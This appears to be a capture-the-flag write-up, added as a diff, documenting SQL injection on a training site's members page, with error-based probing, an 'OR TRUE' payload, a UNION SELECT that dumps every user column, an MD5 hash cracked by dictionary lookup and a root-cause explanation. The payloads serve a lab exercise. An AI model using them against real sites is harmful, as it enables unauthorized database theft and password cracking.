@@ -1,0 +1,55 @@
+Vulnerability: SQL Injection (Boolean-based & UNION-based) - Members search page
+
+Description:
+The Members page (index.php?page=member) accepts a GET parameter "id"
+that is concatenated directly into a SQL query without sanitization,
+allowing SQL injection.
+
+Underlying query (confirmed via error + behavior):
+  SELECT first_name, surname FROM users WHERE users.id = <id>
+
+Step 1 - Confirm injection point:
+  Payload: id=42'
+  Result: Raw MariaDB syntax error returned, confirming unsanitized
+  concatenation of user input into the SQL query.
+
+Step 2 - Boolean-based injection (proof of concept):
+  Payload: id=1 OR TRUE
+  Result: WHERE clause became always-true, returning every row in the
+  "users" table instead of just id=1 (one/two/three/Flag-GetThe...).
+
+Step 3 - UNION-based injection to dump full row data:
+  Payload:
+    -1 UNION SELECT CONCAT(user_id, first_name, last_name, town,
+    country, planet, Commentaire, countersign) AS test, 1 FROM users
+
+  This bypasses the original WHERE filter using a non-existent id (-1)
+  combined with UNION, concatenating every column into a single
+  displayed string per row.
+
+Step 4 - Flag row identified:
+  user_id: 5
+  first_name: Flag
+  last_name: GetThe
+  country: 424242
+  Commentaire: "Decrypt this password -> then lower all the char.
+                Sha256 on it and it's good!"
+  countersign (MD5): 5ff9d0165b4f92b14994e5c685cdce28
+
+Step 5 - Crack the MD5:
+  Looked up 5ff9d0165b4f92b14994e5c685cdce28 against an MD5 dictionary
+  lookup service, which returned the plaintext: "FortyTwo"
+
+Step 6 - Follow the Commentaire instructions:
+  Lowercase the plaintext: "fortytwo"
+  Compute SHA256:
+    $ echo -n "fortytwo" | sha256sum
+
+Root cause:
+  User input ("id") is concatenated directly into a SQL query string
+  instead of being passed as a parameterized/bound value, allowing an
+  attacker to alter query logic (boolean injection) and exfiltrate
+  arbitrary data from the database (UNION injection).
+
+Flag obtained:
+  <PASTE FINAL SHA256 OUTPUT HERE>
